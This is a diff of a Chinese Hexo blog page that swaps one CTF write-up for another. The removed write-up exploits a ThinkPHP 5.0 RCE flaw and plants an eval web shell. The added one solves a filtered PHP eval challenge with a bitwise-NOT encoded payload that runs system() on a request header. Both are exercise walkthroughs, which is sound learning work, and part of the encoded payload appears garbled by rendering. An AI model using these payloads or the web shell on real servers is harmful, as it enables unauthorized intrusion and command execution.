@@ -4,17 +4,17 @@
   <meta charset="utf-8">
   
   
-  <title>第一周1 | Hexo</title>
+  <title>第一周2 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="题解  ：[SWPUCTF 2022 新生赛]ez_rce   打开这个题目  发现什么也没有          这个时候可以用dirsearch -u “网址” 来看一下该网址的文件和目录发现robotx.txt文件  我们打开看一下发现提示NSS&#x2F;index.php&#x2F;  我们把NSS&#x2F;index.php&#x2F;这个路径输上去发现弹出来Think.php 5.0">
+  <meta name="description" content="[鹏城杯 2022]简单的php  打开环境 发现php代码 如下： 80 or preg_match(&#39;&#x2F;[A-Za-z0-9]|\&#39;|&quot;|&#96;|\ |,|\.|-|\+|&#x3D;|\&#x2F;|\\||\$|\?|\^|&amp;|\|&#x2F;is&#39;,$code)){      die(&#39; Hello&#39;);  }else if(&#39;;&#39; &#x3D;&#x3D;&#x3D;preg_replace(&#39;&#x2F;[^\s\(\)]+?\((?R)?\)&#x2F;&#39;, &#39;&#39;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="第一周1">
-<meta property="og:url" content="http://example.com/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A81/index.html">
+<meta property="og:title" content="第一周2">
+<meta property="og:url" content="http://example.com/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A82/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="题解  ：[SWPUCTF 2022 新生赛]ez_rce   打开这个题目  发现什么也没有          这个时候可以用dirsearch -u “网址” 来看一下该网址的文件和目录发现robotx.txt文件  我们打开看一下发现提示NSS&#x2F;index.php&#x2F;  我们把NSS&#x2F;index.php&#x2F;这个路径输上去发现弹出来Think.php 5.0">
+<meta property="og:description" content="[鹏城杯 2022]简单的php  打开环境 发现php代码 如下： 80 or preg_match(&#39;&#x2F;[A-Za-z0-9]|\&#39;|&quot;|&#96;|\ |,|\.|-|\+|&#x3D;|\&#x2F;|\\||\$|\?|\^|&amp;|\|&#x2F;is&#39;,$code)){      die(&#39; Hello&#39;);  }else if(&#39;;&#39; &#x3D;&#x3D;&#x3D;preg_replace(&#39;&#x2F;[^\s\(\)]+?\((?R)?\)&#x2F;&#39;, &#39;&#39;">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2025-01-13T02:08:54.000Z">
-<meta property="article:modified_time" content="2025-01-13T02:45:35.313Z">
+<meta property="article:published_time" content="2025-01-13T02:50:23.000Z">
+<meta property="article:modified_time" content="2025-01-13T03:42:53.275Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -71,10 +71,10 @@
 </header>
 
       <div class="outer">
-        <section id="main"><article id="post-第一周1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+        <section id="main"><article id="post-第一周2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A81/" class="article-date">
-  <time class="dt-published" datetime="2025-01-13T02:08:54.000Z" itemprop="datePublished">2025-01-13</time>
+    <a href="/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A82/" class="article-date">
+  <time class="dt-published" datetime="2025-01-13T02:50:23.000Z" itemprop="datePublished">2025-01-13</time>
 </a>
     
   </div>
@@ -85,7 +85,7 @@
         
   
     <h1 class="p-name article-title" itemprop="headline name">
-      第一周1
+      第一周2
     </h1>
   
 
@@ -93,28 +93,46 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>题解  ：[SWPUCTF 2022 新生赛]ez_rce<br>   打开这个题目  发现什么也没有        </p>
+        <p>[鹏城杯 2022]简单的php</p>
 <ol>
-<li><p>这个时候可以用dirsearch -u “网址” 来看一下该网址的文件和目录<br>发现robotx.txt文件  我们打开看一下<br>发现提示NSS&#x2F;index.php&#x2F;</p>
+<li>打开环境 发现php代码 如下：<?php
+show_source(__FILE__);
+ $code = $_GET['code'];
+ if(strlen($code) > 80 or preg_match('/[A-Za-z0-9]|\'|"|`|\ |,|\.|-|\+|=|\/|\\|<|>|\$|\?|\^|&|\|/is',$code)){
+     die(' Hello');
+ }else if(';' ===preg_replace('/[^\s\(\)]+?\((?R)?\)/', '', $code)){
+     @eval($code);
+
+ }</li>
+</ol>
+<p>?&gt; </p>
+<ol start="2">
+<li><p>代码审计 对于 “if(strlen($code) &gt; 80 or preg_match(‘&#x2F;[A-Za-z0-9]|&#39;|”|&#96;|\ |,|.|-|+|&#x3D;|/|\|&lt;|&gt;|$|?|^|&amp;||&#x2F;is’,$code))”<br>就是用get方式提交的code参数 字符串长度大于80 或者 code参数不能有任何字母和数字 还有” ‘等一些符号<br>这时我们发现 没有过滤 ~ 这个符号<br>这个时候就想到了取反</p>
 </li>
-<li><p>我们把NSS&#x2F;index.php&#x2F;这个路径输上去<br>发现弹出来Think.php 5.0  由此我们可以联想到Think.php 5.0 漏洞</p>
+<li><p>对于”(‘;’ &#x3D;&#x3D;&#x3D;preg_replace(‘&#x2F;[^\s()]+?((?R)?)&#x2F;‘, ‘’, $code))”<br>‘;’ &#x3D;&#x3D;&#x3D; preg_replace(‘&#x2F;[^\s()]+?((?R)?)&#x2F;‘, ‘’, $code)<br>[^\s()]+? 表示不匹配所有空白符和() 一次或多次<br>((?R)?) 表示循环匹配() 一次或0次<br>那么这题的解法就属于无参数的取反RCE，并且需要二维数组绕过<br>payload：system(end(getallheaders()));<br>构造取反二维数组拼接 [system]<a href="%5Bend%5D%5B0%5D(%5Bgetallheaders%5D%5B0%5D())">0</a></p>
 </li>
-<li><p>我们在网上找一下 <a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1863419/202112/1863419-20211224202858742-1691585409.png">https://img2020.cnblogs.com/blog/1863419/202112/1863419-20211224202858742-1691585409.png</a><br>该网址是这个漏洞的利用方式</p>
+<li><p>用上我们的取反代码 如下：</p>
+ <?php
+echo '~'.urlencode(~'system');
+echo "\n";
+echo '~'.urlencode(~'end');
+echo  "\n";
+echo '~'.urlencode(~'getallheaders');
+echo  "\n";
+echo '~'.urlencode(~'0');
+?>
+<p>最终payload：<br>[<del>%8C%86%8C%8B%9A%92][!%FF]([</del>%9A%91%9B]<a href="%5B~%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%5D%5B!%EF%BF%BD%5D()">!%FF</a>);</p>
 </li>
-<li><p>s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;ls &#x2F;</p>
-<p>bin boot dev etc flag home lib lib64 media mnt nss opt proc root run sbin srv sys tmp usr var var 好熟悉的界面 似曾相识啊</p>
-<p>发现flag 我们把这个ls &#x2F;换为cat &#x2F;flag<br>发现啥也没有</p>
+<li><p>最后在burp抓包的get方式提交 code&#x3D;[<del>%8C%86%8C%8B%9A%92][!%FF]([</del>%9A%91%9B]<a href="%5B~%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%5D%5B!%EF%BF%BD%5D()">!%FF</a>);<br>在请求头中 随便加一个  eg：x:cat &#x2F;*<br>发现flag</p>
 </li>
-<li><p>这个时候就感觉可能是套娃了  我选择构造文件来看看<br>payload ：s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;file_put_contents&amp;vars[1][]&#x3D;eval.php&amp;vars[1][]&#x3D;<?php eval($_POST['cmd']);?></p>
-</li>
-<li><p>我们打开中国蚁剑  路径为：<br>NSS&#x2F;eval.php 密码为 cmd<br>发现连接成功<br>发现flag<br>这个题也太坑了  真的是套娃  真的flag在nss&#x2F;ctf&#x2F;flag&#x2F;flag路径下<br>7.总结：<br>  发现页面啥也没有时 可以用dirsearch工具进行 网站目录和文件的扫描 一般可疑文件：robots.txt index.php flag.php<br>  如何出现flag但打开发现没有时 我们可以选择构造文件上传到该网站当前的目录下<br>  最终找到真的flag</p>
+<li><p>总结：<br>这题就是无回显rce  无字母<br>可以用取反 异或等方式去写<br>用取反的时候 如果 ~ 没有被过滤的前提下</p>
 </li>
 </ol>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A81/" data-id="cm5ui0zk9000ceouicc3oexg1" data-title="第一周1" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A82/" data-id="cm5ui0zk8000beoui4djrdhbb" data-title="第一周2" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -124,19 +142,10 @@
     
 <nav id="article-nav">
   
-    <a href="/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A82/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          第一周2
-        
-      </div>
-    </a>
   
-  
-    <a href="/2025/01/12/sx/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A81/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">sx</div>
+      <div class="article-nav-title">第一周1</div>
     </a>
   
 </nav>
